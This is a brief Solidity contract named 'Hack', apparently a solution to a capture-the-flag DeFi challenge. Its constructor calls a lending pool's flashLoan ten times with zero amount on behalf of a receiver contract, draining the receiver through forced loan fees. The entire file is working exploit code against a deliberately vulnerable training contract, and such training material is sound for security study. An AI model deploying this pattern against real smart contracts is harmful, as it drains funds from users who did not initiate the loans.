// SPDX-License-Identifier: BSD-3-Clause-Nuclear-License

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "./NaiveReceiverLenderPool.sol";

/**
 * @title Hack
 * @author room2042
 */
contract Hack {
    using Address for address payable;

    constructor(address payable poolAddress, address receiver) {
        for (uint i = 0; i < 10; ++i) {
            NaiveReceiverLenderPool(poolAddress).flashLoan(receiver, 0);
        }
    }
}
